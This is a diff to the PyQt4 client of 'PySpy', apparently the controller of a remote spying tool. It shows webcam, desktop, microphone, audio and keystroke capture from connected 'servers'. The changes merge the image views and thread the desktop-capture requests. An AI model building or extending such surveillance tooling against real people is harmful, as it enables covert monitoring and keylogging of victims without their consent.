@@ -71,12 +71,9 @@ class Client(QtGui.QMainWindow):
 		self.verticalLayout_6.setObjectName(_fromUtf8("verticalLayout_6"))
 		self.horizontalLayout_7 = QtGui.QHBoxLayout()
 		self.horizontalLayout_7.setObjectName(_fromUtf8("horizontalLayout_7"))
-		self.qWebCam = QtGui.QGraphicsView(self.centralwidget)
-		self.qWebCam.setObjectName(_fromUtf8("qWebCam"))
-		self.horizontalLayout_7.addWidget(self.qWebCam)
-		self.qDesktop = QtGui.QGraphicsView(self.centralwidget)
-		self.qDesktop.setObjectName(_fromUtf8("qDesktop"))
-		self.horizontalLayout_7.addWidget(self.qDesktop)
+		self.qImage = QtGui.QGraphicsView(self.centralwidget)
+		self.qImage.setObjectName(_fromUtf8("qImage"))
+		self.horizontalLayout_7.addWidget(self.qImage)
 		self.verticalLayout_6.addLayout(self.horizontalLayout_7)
 		self.keyboard = QtGui.QLineEdit(self.centralwidget)
 		self.keyboard.setObjectName(_fromUtf8("keyboard"))
@@ -191,14 +188,14 @@ class Client(QtGui.QMainWindow):
 		self.btnLogin.setObjectName(_fromUtf8("btnLogin"))
 		self.btnConnectWebCam = QtGui.QAction(MainWindow)
 		self.btnConnectWebCam.setObjectName(_fromUtf8("btnConnectWebCam"))
-		self.btnConnectDesktop = QtGui.QAction(MainWindow)
-		self.btnConnectDesktop.setObjectName(_fromUtf8("btnConnectDesktop"))
+		self.btnConnectMicrophone = QtGui.QAction(MainWindow)
+		self.btnConnectMicrophone.setObjectName(_fromUtf8("btnConnectMicrophone"))
 		self.btnConnectDesktop = QtGui.QAction(MainWindow)
 		self.btnConnectDesktop.setObjectName(_fromUtf8("btnConnectDesktop"))
 		self.btnDisconnectWebCam = QtGui.QAction(MainWindow)
 		self.btnDisconnectWebCam.setObjectName(_fromUtf8("btnDisconnectWebCam"))
-		self.btnDisconnectDesktop = QtGui.QAction(MainWindow)
-		self.btnDisconnectDesktop.setObjectName(_fromUtf8("btnDisconnectDesktop"))
+		self.btnDisconnectMicrophone = QtGui.QAction(MainWindow)
+		self.btnDisconnectMicrophone.setObjectName(_fromUtf8("btnDisconnectMicrophone"))
 		self.btnDisconnectDesktop = QtGui.QAction(MainWindow)
 		self.btnDisconnectDesktop.setObjectName(_fromUtf8("btnDisconnectDesktop"))
 		self.btnConnectKeyboard = QtGui.QAction(MainWindow)
@@ -215,6 +212,7 @@ class Client(QtGui.QMainWindow):
 		self.retranslateUi(MainWindow)
 		QtCore.QMetaObject.connectSlotsByName(MainWindow)
 
+
 	def retranslateUi(self, MainWindow):
 		MainWindow.setWindowTitle(_translate("MainWindow", "PySpy", None))
 		self.label_5.setText(_translate("MainWindow", "Servers", None))
@@ -223,7 +221,7 @@ class Client(QtGui.QMainWindow):
 		self.label.setText(_translate("MainWindow", "WebCam", None))
 		self.connectWebCam.setText(_translate("MainWindow", "Connect", None))
 		self.disconnectWebCam.setText(_translate("MainWindow", "Disconnect", None))
-		self.label_2.setText(_translate("MainWindow", "Desktop", None))
+		self.label_2.setText(_translate("MainWindow", "Microfone", None))
 		self.connectDesktop.setText(_translate("MainWindow", "Connect", None))
 		self.disconnectDesktop.setText(_translate("MainWindow", "Disconnect", None))
 		self.label_3.setText(_translate("MainWindow", "Audio", None))
@@ -236,10 +234,10 @@ class Client(QtGui.QMainWindow):
 		self.btnConnectServer.setText(_translate("MainWindow", "Connect in Server", None))
 		self.btnLogin.setText(_translate("MainWindow", "Login", None))
 		self.btnConnectWebCam.setText(_translate("MainWindow", "Connect", None))
-		self.btnConnectDesktop.setText(_translate("MainWindow", "Connect", None))
+		self.btnConnectMicrophone.setText(_translate("MainWindow", "Connect", None))
 		self.btnConnectDesktop.setText(_translate("MainWindow", "Connect", None))
 		self.btnDisconnectWebCam.setText(_translate("MainWindow", "Disconnect", None))
-		self.btnDisconnectDesktop.setText(_translate("MainWindow", "Disconnect", None))
+		self.btnDisconnectMicrophone.setText(_translate("MainWindow", "Disconnect", None))
 		self.btnDisconnectDesktop.setText(_translate("MainWindow", "Disconnect", None))
 		self.btnConnectKeyboard.setText(_translate("MainWindow", "Connect", None))
 		self.btnDisconnectKeyboard.setText(_translate("MainWindow", "Disconnect", None))
@@ -311,27 +309,15 @@ class Client(QtGui.QMainWindow):
 		t.start()
 		
 	def streamImage(self):
-		print "Entrou na etream"
-		self.setImageinWebCam(SAVEDIR + 'image.jpg')
+		self.setImage(SAVEDIR + 'image.jpg')
 	def requestDisplay(self):
-		self.streamDisplay(self.__server_connected)
+		t = UpdateDesktop(self.__server_connected, self.__manager, self)
+		QtCore.QObject.connect(t, QtCore.SIGNAL(_fromUtf8("update()")), self.streamDisplay)
+		t.start()
 		
-	def streamDisplay(self, address):
-		socketServer = socket(AF_INET, SOCK_STREAM)
-		try:	
-			socketServer.connect(address)
-		except:
-			print "IP or PORT invalid!!!"
-			return
-		while True:
-			try:
-				path = self.__manager.requestDisplay(socketServer)
-				if path == None:
-					continue
-				self.setImageinDesktop(path)
-			except:
-				continue
-			break
+	def streamDisplay(self):
+		self.setImage(SAVEDIR + 'display.png')
+		
 	def requestAudio(self, size = 1024 * 5 ):
 		self.streamAudio(self.__server_connected, size)
 		
@@ -378,14 +364,7 @@ class Client(QtGui.QMainWindow):
 			self.keyboard.setText(open(fileKeys, "r").read())
 			break
 	
-	def setImageinWebCam(self, path):
+	def setImage(self, path):
 		scene = QGraphicsScene()
 		scene.addPixmap(QPixmap(path))
-		self.qWebCam.setScene(scene)
-
-
-
-	def setImageinDesktop(self, path):
-		scene = QGraphicsScene()
-		scene.addPixmap(QPixmap(path))
-		self.qDesktop.setScene(scene)
+		self.qImage.setScene(scene)
